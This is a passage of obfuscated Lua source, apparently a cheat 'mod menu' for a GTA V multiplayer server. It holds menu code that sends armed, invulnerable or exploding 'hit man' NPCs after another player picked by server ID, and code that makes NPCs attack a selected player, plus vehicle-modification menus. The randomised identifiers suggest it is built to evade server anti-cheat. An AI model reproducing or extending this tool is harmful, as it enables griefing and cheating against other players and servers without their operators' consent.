                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Hit Man's Car: ", 2, hitmany) then
                            local textie = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Car Model', '', 100)
                            if textie and nlFXKkFxuKQAk.natives.IsModelValid(textie) and nlFXKkFxuKQAk.natives.IsModelAVehicle(textie) then
                                if not nlFXKkFxuKQAk.natives.IsThisModelABicycle(textie) and not nlFXKkFxuKQAk.natives.IsThisModelABoat(textie) and not nlFXKkFxuKQAk.natives.IsThisModelAHeli(textie) and not nlFXKkFxuKQAk.natives.IsThisModelAJetski(textie) and not nlFXKkFxuKQAk.natives.IsThisModelAPlane(textie) and not nlFXKkFxuKQAk.natives.IsThisModelATrain(textie) then
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Set The Vehicle To: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie).. '')
                                    jrnyLearIyzKiSIen.config.hitmancar = textie
                                else
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie) ..' ~w~Is Not A Car or Bike!')
                                end
                            else
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie) ..' ~w~Is Not A Vehicle!')
                            end
                        end
                        jrnyLearIyzKiSIen.func.DrawSomeText('' .. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(jrnyLearIyzKiSIen.config.hitmancar) .. '', 4, false, jrnyLearIyzKiSIen.config.MainX + 82, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 + hitmany - 10, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        hitmany = hitmany + 20
                    end
                    -- if flyby heli 70

                    if REVMYmrswsZvxOXvJE.HitMethod.values[REVMYmrswsZvxOXvJE.HitMethod.selectedItemIndex] == 4 then
                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Hit Man's Heli: ", 2, hitmany) then
                            local textie = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Heli Model', '', 100)
                            if textie and nlFXKkFxuKQAk.natives.IsModelValid(textie) and nlFXKkFxuKQAk.natives.IsModelAVehicle(textie) then
                                if not nlFXKkFxuKQAk.natives.IsThisModelABicycle(textie) and not nlFXKkFxuKQAk.natives.IsThisModelABoat(textie) and not nlFXKkFxuKQAk.natives.IsThisModelACar(textie) and not nlFXKkFxuKQAk.natives.IsThisModelAJetski(textie) and not nlFXKkFxuKQAk.natives.IsThisModelAPlane(textie) and not nlFXKkFxuKQAk.natives.IsThisModelATrain(textie) and not nlFXKkFxuKQAk.natives.IsThisModelAQuadbike(textie) and not nlFXKkFxuKQAk.natives.IsThisModelAnAmphibiousCar(textie) and not nlFXKkFxuKQAk.natives.IsThisModelAnAmphibiousQuadbike(textie) then
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Set The Vehicle To: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie).. '')
                                    jrnyLearIyzKiSIen.config.hitmanheli = textie
                                else
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie) ..' ~w~Is Not A Helicopter!')
                                end
                            else
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie) ..' ~w~Is Not A Vehicle!')
                            end
                        end
                        jrnyLearIyzKiSIen.func.DrawSomeText('' .. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(jrnyLearIyzKiSIen.config.hitmanheli) .. '', 4, false, jrnyLearIyzKiSIen.config.MainX + 82, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 + hitmany - 10, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        hitmany = hitmany + 20
                    end

                    -- ped type 90
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox("Hit Man's Ped", REVMYmrswsZvxOXvJE.HitManModle.items, REVMYmrswsZvxOXvJE.HitManModle.currentItemIndex, REVMYmrswsZvxOXvJE.HitManModle.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.HitManModle.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.HitManModle.selectedItemIndex = selectedIndex
                    end, 2, hitmany) then end
                    hitmany = hitmany + 20
                    if REVMYmrswsZvxOXvJE.HitMethod.values[REVMYmrswsZvxOXvJE.HitMethod.selectedItemIndex] ~= 2 then
                        -- ped weapon 110
                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Hit Man's Gun: ", 2, hitmany) then
                            local textie = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Weapon Name', 'weapon_', 100)
                            if textie and nlFXKkFxuKQAk.natives.IsWeaponValid(textie) then
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Set The Weapon To: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie).. '')
                                jrnyLearIyzKiSIen.config.hitmangun = textie
                            else
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie) ..' ~w~Is Not A Valid Weapon!')
                            end
                        end
                        jrnyLearIyzKiSIen.func.DrawSomeText('' .. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(jrnyLearIyzKiSIen.config.hitmangun) .. '', 4, false, jrnyLearIyzKiSIen.config.MainX + 82, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 + hitmany - 10, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        hitmany = hitmany + 20
                        -- ped accuracy 130
                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Hit Man's Accuracy: ", 2, hitmany) then
                            local textie = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Hit Man Accuracy 0-100', '', 3)
                            if RfPsUKHSFWJuBEJuz.rE.LumToNum(textie) and RfPsUKHSFWJuBEJuz.rE.LumToNum(textie) >= 0 and RfPsUKHSFWJuBEJuz.rE.LumToNum(textie) <= 100 then
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Accuracy Has Been Set To: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie) ..'') 
                                jrnyLearIyzKiSIen.config.hitmanac = textie
                            else
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie) ..' ~w~Accuracy Is Too High!')
                            end
                        end
                        jrnyLearIyzKiSIen.func.DrawSomeText('' .. jrnyLearIyzKiSIen.config.hitmanac .. '', 4, false, jrnyLearIyzKiSIen.config.MainX + 103, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 + hitmany - 10, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        hitmany = hitmany + 20
                    end
                        -- godmode? 150
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Hit Man Is God', jrnyLearIyzKiSIen.config.features.hitmangod, function(enabled) jrnyLearIyzKiSIen.config.features.hitmangod = enabled end, 2, hitmany) then 
                        if jrnyLearIyzKiSIen.config.features.hitmangod then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Hit Man Will Now Be In ~b~God Mode') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Hit Man Will Not Be In ~b~God Mode') end
                    end
                    hitmany = hitmany + 20
                    if REVMYmrswsZvxOXvJE.HitMethod.values[REVMYmrswsZvxOXvJE.HitMethod.selectedItemIndex] ~= 2 then    
                        -- ped exploads on death? 170
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Hit Man Explodes On Kill', jrnyLearIyzKiSIen.config.features.hitmanexpload, function(enabled) jrnyLearIyzKiSIen.config.features.hitmanexpload = enabled end, 2, hitmany) then 
                            if jrnyLearIyzKiSIen.config.features.hitmanexpload then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Hit Man Will Now ~r~Expload ~w~On Death') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Hit Man Will Not ~r~Expload ~w~On Death') end
                        end
                        hitmany = hitmany + 20
                    end
                        -- send da hit button 190
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Send Hit', 2, hitmany) then
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sent The Hit')
                        if REVMYmrswsZvxOXvJE.HitManModle.values[REVMYmrswsZvxOXvJE.HitManModle.selectedItemIndex] == 102 then
                            local fuckermen = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput("Enter The Person's ID That You Want The Hitman To Be", '', 5)
                            if nlFXKkFxuKQAk.natives.GetPlayerPed(nlFXKkFxuKQAk.natives.GetPlayerFromServerId(RfPsUKHSFWJuBEJuz.rE.LumToNum(fuckermen))) ~= 0 then
                                DmSgpcIoUEJtyTfBBt.FunFunc.sendhit(REVMYmrswsZvxOXvJE.HitMethod.values[REVMYmrswsZvxOXvJE.HitMethod.selectedItemIndex], REVMYmrswsZvxOXvJE.HitManModle.values[REVMYmrswsZvxOXvJE.HitManModle.selectedItemIndex], jrnyLearIyzKiSIen.config.hitmanac, jrnyLearIyzKiSIen.config.features.hitmangod, jrnyLearIyzKiSIen.config.features.hitmanexpload, jrnyLearIyzKiSIen.config.hitmangun, jrnyLearIyzKiSIen.config.SelecOP, jrnyLearIyzKiSIen.config.hitmancar, jrnyLearIyzKiSIen.config.hitmanheli, nlFXKkFxuKQAk.natives.GetPlayerFromServerId(RfPsUKHSFWJuBEJuz.rE.LumToNum(fuckermen)))
                            else
                                print('nooooo')
                            end
                        else
                            print(json.encode(jrnyLearIyzKiSIen.config))
                            DmSgpcIoUEJtyTfBBt.FunFunc.sendhit(REVMYmrswsZvxOXvJE.HitMethod.values[REVMYmrswsZvxOXvJE.HitMethod.selectedItemIndex], REVMYmrswsZvxOXvJE.HitManModle.values[REVMYmrswsZvxOXvJE.HitManModle.selectedItemIndex], jrnyLearIyzKiSIen.config.hitmanac, jrnyLearIyzKiSIen.config.features.hitmangod, jrnyLearIyzKiSIen.config.features.hitmanexpload, jrnyLearIyzKiSIen.config.hitmangun, jrnyLearIyzKiSIen.config.SelecOP, jrnyLearIyzKiSIen.config.hitmancar, jrnyLearIyzKiSIen.config.hitmanheli)
                        end
                    end
                    hitmany = hitmany + 20
                elseif REVMYmrswsZvxOXvJE.Mopt5.values[REVMYmrswsZvxOXvJE.Mopt5.selectedItemIndex] == 5 then
                    jrnyLearIyzKiSIen.config.offset2 = jrnyLearIyzKiSIen.config.offset2 + 75
                    jrnyLearIyzKiSIen.config.Men3Y = jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men4Y = jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men5Y = jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset2, jrnyLearIyzKiSIen.config.CSecondary2.r, jrnyLearIyzKiSIen.config.CSecondary2.g, jrnyLearIyzKiSIen.config.CSecondary2.b, jrnyLearIyzKiSIen.config.CSecondary2.a)
                    
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Choose The Guns They Will Use', REVMYmrswsZvxOXvJE.AngryNpcs.items, REVMYmrswsZvxOXvJE.AngryNpcs.currentItemIndex, REVMYmrswsZvxOXvJE.AngryNpcs.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.AngryNpcs.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.AngryNpcs.selectedItemIndex = selectedIndex
                    end, 2, 50) then end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Make The Peds Attack', 2, 70) then
                        DmSgpcIoUEJtyTfBBt.FunFunc.PedAttack(jrnyLearIyzKiSIen.config.SelecOP, REVMYmrswsZvxOXvJE.AngryNpcs.values[REVMYmrswsZvxOXvJE.AngryNpcs.selectedItemIndex])
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Ped Are ~g~Attacking ~w~The Player!')
                    end
                end
            end
                --VEHICLE OPTIONS
            if jrnyLearIyzKiSIen.config.Men3T then
                jrnyLearIyzKiSIen.config.offset3 = jrnyLearIyzKiSIen.config.offset3 + 255
                jrnyLearIyzKiSIen.config.Men4Y = jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.offset3
                jrnyLearIyzKiSIen.config.Men5Y = jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.offset3
                jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs3, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset3, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)
                
                if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox(' ', REVMYmrswsZvxOXvJE.Mopt.items, REVMYmrswsZvxOXvJE.Mopt.currentItemIndex, REVMYmrswsZvxOXvJE.Mopt.selectedItemIndex, function(currentIndex, selectedIndex)
                    REVMYmrswsZvxOXvJE.Mopt.currentItemIndex = currentIndex 
                    REVMYmrswsZvxOXvJE.Mopt.selectedItemIndex = selectedIndex
                end, 3, 10, -20) then end
                
                if REVMYmrswsZvxOXvJE.Mopt.values[REVMYmrswsZvxOXvJE.Mopt.selectedItemIndex] == 2 then

                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('', REVMYmrswsZvxOXvJE.Mopt2.items, REVMYmrswsZvxOXvJE.Mopt2.currentItemIndex, REVMYmrswsZvxOXvJE.Mopt2.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.Mopt2.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.Mopt2.selectedItemIndex = selectedIndex
                    end, 3, 30) then end

                    if REVMYmrswsZvxOXvJE.Mopt2.values[REVMYmrswsZvxOXvJE.Mopt2.selectedItemIndex] then
                        local curvopt1 = curvopt
                        jrnyLearIyzKiSIen.config.vehoff = 30
                        jrnyLearIyzKiSIen.config.vehoff1 = -10
                        jrnyLearIyzKiSIen.config.vehoff2 = 30
                        jrnyLearIyzKiSIen.config.vehoff3 = -10
                        jrnyLearIyzKiSIen.config.vehoff4 = -10
                        if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false) then
                            if curvopt1 == nil then
                                for i, mod in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.func.elModlister) do
                                    nlFXKkFxuKQAk.natives.SetVehicleModKit(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0)
                                    local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), mod.id)
                                    local installed = jrnyLearIyzKiSIen.func.VehProperties(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
                                    local isbikeyea = nlFXKkFxuKQAk.natives.GetVehicleClass(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
                                    if isbikeyea == 8 then
                                        if modCount > 0 or mod.id == 100 or mod.id == 101 then
                                            jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                            if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                                jrnyLearIyzKiSIen.config.vehoff1 = 180
                                                jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                                jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                            elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                                jrnyLearIyzKiSIen.config.vehoff1 = 110
                                                jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                                jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                            elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                                jrnyLearIyzKiSIen.config.vehoff1 = 50
                                                jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                                jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                            end
                                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button(mod.name, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                                curvopt = mod.name
                                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Modifing ~g~'..mod.name..'')
                                            end
                                        end
                                    else
                                        if modCount > 0 or mod.id == 100 or mod.id == 101 or mod.id == 102 then
                                            jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                            if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                                jrnyLearIyzKiSIen.config.vehoff1 = 180
                                                jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                                jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                            elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                                jrnyLearIyzKiSIen.config.vehoff1 = 110
                                                jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                                jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                            elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                                jrnyLearIyzKiSIen.config.vehoff1 = 50
                                                jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                                jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                            end
                                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button(mod.name, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                                curvopt = mod.name
                                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Modifing ~g~'..mod.name..'')
                                                for i = 0, 1000, 1 do
                                                    RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(REVMYmrswsZvxOXvJE.WChanger1.items)
                                                    RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(REVMYmrswsZvxOXvJE.WColor.items)
                                                    RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(REVMYmrswsZvxOXvJE.WColor.values)
                                                    refresh = false
                                                end
                                            end
                                        end
                                    end
                                end
                            elseif curvopt1 == 'Front Bumper' then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 1)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 1, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 70 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 70
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 1, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == 'Rear Bumper' then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 2)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 2, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 2, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil 
                                end    
                            elseif curvopt1 == 'Spoilers' then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 130 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 200
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 70 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 130
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 70
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                    
                                end
                            elseif curvopt1 == "Hood" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 7)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 7, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 80 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
